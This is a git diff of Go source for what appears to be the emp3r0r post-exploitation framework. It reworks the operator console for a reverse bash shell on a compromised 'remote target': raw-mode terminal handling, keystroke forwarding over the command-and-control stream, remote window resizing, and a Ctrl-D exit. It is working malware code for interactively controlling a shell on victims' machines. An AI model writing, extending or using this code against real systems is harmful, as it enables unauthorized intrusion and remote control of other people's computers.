@@ -1,13 +1,16 @@
 package cc
 
 import (
+	"bufio"
 	"fmt"
 	"log"
 	"os"
 	"os/exec"
-	"strings"
+	"os/signal"
+	"syscall"
 
 	"github.com/creack/pty"
+	"github.com/fatih/color"
 	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
 )
 
@@ -24,23 +27,39 @@ func reverseBash() {
 		CliPrintError("Cannot activate reverse shell on remote target: ", err)
 		return
 	}
-	defer func() {
-		_ = exec.Command("stty", "sane").Run()
+
+	// use /dev/tty for our console
+	ttyf, err := os.Open("/dev/tty")
+	if err != nil {
+		CliPrintError("Cannot open /dev/tty: %v", err)
+	}
+
+	cleanup := func() {
+		out, err := exec.Command("stty", "-F", "/dev/tty", "sane").CombinedOutput()
+		if err != nil {
+			CliPrintError("failed to restore terminal: %v\n%s", err, out)
+		}
+
 		err = agent.CCStream.Close()
 		if err != nil {
 			CliPrintWarning("Closing reverse shell connection: ", err)
 		}
-	}()
+	}
+	defer cleanup()
 
+	// receive and display bash's output
 	go func() {
 		for incoming := range RecvAgentBuf {
 			os.Stdout.Write(incoming)
 		}
 	}()
 
+	// send whatever input to target's bash
 	go func() {
-		// send to target
 		for outgoing := range SendAgentBuf {
+			if agent.CCStream == nil {
+				continue
+			}
 			_, err = agent.CCStream.Write(outgoing)
 			if err != nil {
 				log.Print("Send to remote: ", err)
@@ -48,51 +67,60 @@ func reverseBash() {
 		}
 	}()
 
-	// set up terminal
+	/*
+		set up terminal
+	*/
+	// Handle pty size.
+	ch := make(chan os.Signal, 1)
+	signal.Notify(ch, syscall.SIGWINCH)
+	go func() {
+		for range ch {
+			if err := pty.InheritSize(os.Stdin, ttyf); err != nil {
+				log.Printf("error resizing pty: %s", err)
+			}
+
+			// set remote stty
+			winSize, err := pty.GetsizeFull(os.Stdin)
+			if err != nil {
+				CliPrintWarning("Cannot get terminal size: %v", err)
+			}
+			setupTermCmd := fmt.Sprintf("stty rows %d columns %d\n",
+				winSize.Rows, winSize.Cols)
+			SendAgentBuf <- []byte(setupTermCmd)
+		}
+	}()
+	ch <- syscall.SIGWINCH // Initial resize.
+
 	currentWinSize, err := pty.GetsizeFull(os.Stdin)
 	if err != nil {
 		CliPrintWarning("Cannot get terminal size: %v", err)
 	}
-	// disable input buffering
-	err = exec.Command("stty", "-F", "/dev/tty", "cbreak", "min", "1").Run()
+
+	// switch to raw mode
+	out, err := exec.Command("stty", "-F", "/dev/tty", "raw", "-echo").CombinedOutput()
 	if err != nil {
-		CliPrintError("stty failed: %v", err)
+		CliPrintError("stty raw mode failed: %v\n%s", err, out)
 		return
 	}
-	// do not display entered characters on the screen
-	err = exec.Command("stty", "-F", "/dev/tty", "-echo").Run()
-	if err != nil {
-		CliPrintError("stty failed: %v", err)
-		return
-	}
+
 	setupTermCmd := fmt.Sprintf("stty rows %d columns %d;reset\n",
 		currentWinSize.Rows, currentWinSize.Cols)
 	SendAgentBuf <- []byte(setupTermCmd)
 
-	ttyf, err := os.Open("/dev/tty")
-	if err != nil {
-		CliPrintError("Cannot open /dev/tty: %v", err)
-	}
 	for {
 		// read stdin
 		buf := make([]byte, agent.BufSize)
-		_, err = ttyf.Read(buf)
+		consoleReader := bufio.NewReader(ttyf)
+		_, err := consoleReader.Read(buf)
 		if err != nil {
 			CliPrintWarning("Bash read input: %v", err)
 		}
-		SendAgentBuf <- buf
-		if isExit(string(buf)) {
+		if buf[0] == 4 { // Ctrl-D is 4
+			color.Red("EOF")
 			break
 		}
-	}
 
-	CliPrintWarning("bash reverse shell exited")
-}
-
-func isExit(cmd string) (exit bool) {
-	if strings.HasPrefix(cmd, "exit\n") ||
-		strings.HasPrefix(cmd, "quit\n") {
-		exit = true
+		// send our byte
+		SendAgentBuf <- buf
 	}
-	return
 }
